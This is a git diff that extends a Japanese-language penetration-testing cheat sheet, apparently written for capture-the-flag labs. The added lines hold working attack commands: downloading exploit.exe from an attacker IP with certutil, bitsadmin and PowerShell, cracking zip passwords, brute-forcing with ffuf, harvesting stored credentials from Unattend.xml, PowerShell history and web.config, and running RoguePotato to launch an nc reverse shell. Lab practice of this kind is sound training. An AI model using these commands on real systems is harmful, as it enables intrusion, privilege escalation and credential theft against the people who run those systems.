@@ -1,5 +1,6 @@
 <!-- MarkdownTOC -->
 
+- add path
 - ファイルの解凍
 - curl
 - DNS
@@ -41,10 +42,19 @@
 - hashcat
 - python
 - bash
-- 
+- Auto Setup Credentials
+- windows history
+- IIS connectstring
+- schtask
+- RoguePotato
+- meterpreter
 
 <!-- /MarkdownTOC -->
 
+# add path
+```shell
+export PATH=$PATH:追加したいコマンド検索パス
+```
 # ファイルの解凍
 ```shell
 # 圧縮
@@ -60,6 +70,12 @@ tar -jxvf xxxx.tar.bz2
 tar -Jxvf xxxx.tar.xz
 tar -xvf xxxx.tar
 unzip xxxx.zip
+
+echo "content" | base64 -d > out
+file out
+# out: Zip archive data, at least v2.0 to extract, compression method=deflate
+unzip out
+fcrackzip -D -p rockyou.txt -u out
 ```
 
 
@@ -191,6 +207,9 @@ ffuf -t 200 -u http://devvortex.htb -w /usr/share/seclists/Discovery/DNS/bitquar
 
 # ブルートフォース
 ffuf -request r.txt -request-proto http -w /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASSFUZZ -mc 200 -t 200
+
+# burp intruderの代用
+ffuf -u http://10.10.10.93/transfer.aspx -w extensions.txt -request request.txt -fw 94
 ```
 
 # sqlmap
@@ -213,7 +232,12 @@ Get-ADPrincipalGroupMembership -Identity fsmith | Select-Object Name
 
 # powershell_download_file
 ```shell
-powershell "(new-object system.net.webclient).downloadfile('http://attackerIP:PORT/exploit.exe','exploit.exe'"
+certutil -urlcache -split -f http://10.10.14.26/exploit.exe exploit.exe
+bitsadmin /transfer transfName /priority high http://10.10.14.26/exploit.exe exploit.exe
+powershell "(new-object system.net.webclient).downloadfile('http://attackerIP:PORT/exploit.exe','exploit.exe')"
+(New-Object Net.WebClient).DownloadFile("http://10.10.14.26/exploit.exe","exploit.exe")
+wget "http://10.10.14.26/exploit.exe" -OutFile "exploit.exe"
+Invoke-WebRequest "http://10.10.14.26/exploit.exe" -OutFile "exploit.exe"
 ```
 
 # enum4linux
@@ -295,6 +319,7 @@ vaultcmd /listcreds:"Web Credentials"
 # cmdkey
 ```bat
 cmdkey /list
+runas /savecred /user:admin cmd.exe
 ```
 
 # RunAs
@@ -484,4 +509,45 @@ f.close()
 /bin/bash -i
 ```
 
-# 
+# Auto Setup Credentials
+```cmd
+C:\Unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+
+rem <Credentials>
+rem     <Username>Administrator</Username>
+rem     <Domain>thm.local</Domain>
+rem     <Password>MyPassword123</Password>
+rem </Credentials>
+```
+
+# windows history
+```cmd
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+
+# IIS connectstring
+```bat
+type C:\inetpub\wwwroot\web.config | findstr connectionString
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+```
+
+# schtask
+```bat
+schtasks /query /tn vulntask /fo list /v
+```
+
+# RoguePotato
+```cmd
+c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
+# In some old versions you need to use the "-f" param
+c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
+```
+
+# meterpreter
+```shell
+run post/multi/recon/local_exploit_suggester
+```
